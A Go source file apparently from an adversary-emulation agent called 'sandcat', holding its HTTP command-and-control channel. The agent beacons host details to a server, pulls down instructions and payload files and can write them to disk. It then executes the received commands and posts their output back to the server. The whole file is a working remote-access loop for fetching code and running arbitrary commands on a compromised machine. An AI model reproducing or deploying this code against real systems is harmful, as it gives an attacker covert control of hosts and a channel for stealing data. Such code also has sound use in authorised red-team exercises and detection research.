package contact

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"path/filepath"
	"sync"

	"../executors/execute"
	"../output"
	"../util"
)

var (
	apiBeacon = "/beacon"
)

//API communicates through HTTP
type API struct { }

func init() {
	CommunicationChannels["HTTP"] = API{}
}

//GetInstructions sends a beacon and returns instructions
func (contact API) GetInstructions(profile map[string]interface{}) map[string]interface{} {
	data, _ := json.Marshal(profile)
	address := fmt.Sprintf("%s%s", profile["server"], apiBeacon)
	bites := request(address, data)
	var out map[string]interface{}
	if bites != nil {
		output.VerbosePrint("[+] beacon: ALIVE")
		var commands interface{}
		json.Unmarshal(bites, &out)
		json.Unmarshal([]byte(out["instructions"].(string)), &commands)
		out["sleep"] = int(out["sleep"].(float64))
		out["watchdog"] = int(out["watchdog"].(float64))
		out["instructions"] = commands
	} else {
		output.VerbosePrint("[-] beacon: DEAD")
	}
	return out
}

// Will fetch all required payloads. If writeToDisk is true, then return []byte will be nil, and
// payload will be written to disk (return string will contain filepath). If writeToDisk is false, then []byte will contain the payload bytes,
// and the returned string will be an empty string
func (contact API) GetPayloadBytes(payload string, server string, uniqueID string, platform string, writeToDisk bool) (string, []byte) {
    var payloadBytes []byte
    location := ""
    output.VerbosePrint(fmt.Sprintf("[*] Downloading new payload bytes: %s", payload))
    address := fmt.Sprintf("%s/file/download", server)
    req, _ := http.NewRequest("POST", address, nil)
    req.Header.Set("file", payload)
    req.Header.Set("platform", platform)
    client := &http.Client{}
    resp, err := client.Do(req)
    if err == nil && resp.StatusCode == ok {
        if writeToDisk {
            location = filepath.Join(payload)
            util.WritePayload(location, resp)
        } else {
            // Not writing to disk - return the payload bytes.
            buf, err := ioutil.ReadAll(resp.Body)
            if err == nil {
                payloadBytes = buf
            }
        }
    }
	return location, payloadBytes
}

//RunInstruction runs a single instruction
func (contact API) RunInstruction(command map[string]interface{}, profile map[string]interface{}, payloads []string, wg *sync.WaitGroup) {
    timeout := int(command["timeout"].(float64))
	result := make(map[string]interface{})
	output, status, pid := execute.RunCommand(command["command"].(string), payloads, command["executor"].(string), timeout)
	result["id"] = command["id"]
	result["output"] = output
	result["status"] = status
	result["pid"] = pid
	 contact.SendExecutionResults(profile, result)
	 (*wg).Done()
}

//C2RequirementsMet determines if sandcat can use the selected comm channel
func (contact API) C2RequirementsMet(criteria map[string]string) bool {
	output.VerbosePrint(fmt.Sprintf("Beacon API=%s", apiBeacon))
	return true
}

//SendExecutionResults will send the execution results to the server.
func (contact API) SendExecutionResults(profile map[string]interface{}, result map[string]interface{}) {
	address := fmt.Sprintf("%s%s", profile["server"], apiBeacon)
	profileCopy := make(map[string]interface{})
	for k,v := range profile {
		profileCopy[k] = v
	}
	results := [1]map[string]interface{}{result}
	profileCopy["results"] = results
	data, _ := json.Marshal(profileCopy)
	request(address, data)
}

func request(address string, data []byte) []byte {
	req, _ := http.NewRequest("POST", address, bytes.NewBuffer(util.Encode(data)))
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := ioutil.ReadAll(resp.Body)
	return util.Decode(string(body))
}